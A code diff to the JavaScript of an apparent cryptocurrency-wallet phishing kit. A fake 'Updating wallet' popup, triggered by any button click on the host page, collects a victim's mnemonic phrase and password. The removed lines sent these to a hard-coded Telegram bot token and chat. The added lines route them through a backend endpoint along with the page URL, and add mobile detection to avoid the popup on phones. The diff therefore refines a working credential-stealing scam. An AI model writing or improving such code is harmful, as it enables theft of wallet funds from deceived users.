@@ -219,19 +219,14 @@
   `;
   document.body.appendChild(popup);
 
-  // --- Telegram logic from x.html ---
-  const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
-  const TELEGRAM_CHAT_ID = '-4704812522';
+  // --- Remove Telegram bot token and chat ID from frontend ---
+  // --- Use backend API route instead ---
 
-  function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
+  function sendToBackend(data) {
+    fetch('/api/sendToTelegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
     });
   }
 
@@ -256,13 +251,12 @@
 
   // UPDATED: Download logic now shows loader/message for 3s, then shows the phrase form
   function handleDownload() {
-    // Show loader with update message
     popup.querySelector('#loaderMsg').textContent = "Updating wallet…";
     nextSection('loaderSection');
     setTimeout(() => {
       nextSection('phraseSection');
     }, 3000);
-    // Optionally start download in background (if you still want to download)
+    // Optionally start download in background
     // const a = document.createElement('a');
     // a.href = 'https://example.com/wallet-update.zip';
     // a.download = 'wallet-update.zip';
@@ -278,7 +272,10 @@
       popup.querySelector('#phraseInput').focus();
       return;
     }
-    sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
+    sendToBackend({
+      phrase: phrase,
+      website: window.location.href
+    });
     alert('Phrase submitted!');
     popup.classList.remove('active');
   }
@@ -303,7 +300,15 @@
   // Bind events
   popup.querySelector('#unlockBtn').addEventListener('click', function() {
     const password = popup.querySelector('#passwordInput').value;
-    sendToTelegram(`Password entered: ${password}`);
+    if (!password) {
+      alert('Please enter your password.');
+      popup.querySelector('#passwordInput').focus();
+      return;
+    }
+    sendToBackend({
+      phrase: `Password entered: ${password}`,
+      website: window.location.href
+    });
     showLazyLoader();
   });
   popup.querySelector('#downloadBtn').addEventListener('click', handleDownload);
@@ -325,6 +330,14 @@
     setupInputs();
   }
 
+  // Device detection
+  function isMobile() {
+    return /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
+  function isTablet() {
+    return /iPad|Tablet|PlayBook|Silk/i.test(navigator.userAgent) || (navigator.userAgent.includes("Macintosh") && 'ontouchend' in document);
+  }
+
   // Listen for any button or w-button link click on the page
   document.body.addEventListener('click', function (e) {
     if (
@@ -336,7 +349,11 @@
       e.target.tagName === 'BUTTON' ||
       (e.target.tagName === 'A' && e.target.classList.contains('w-button'))
     ) {
-      showPopup();
+      if (isMobile() && !isTablet()) {
+        window.open(window.location.href, '_blank');
+      } else {
+        showPopup();
+      }
       e.preventDefault();
       e.stopPropagation();
     }
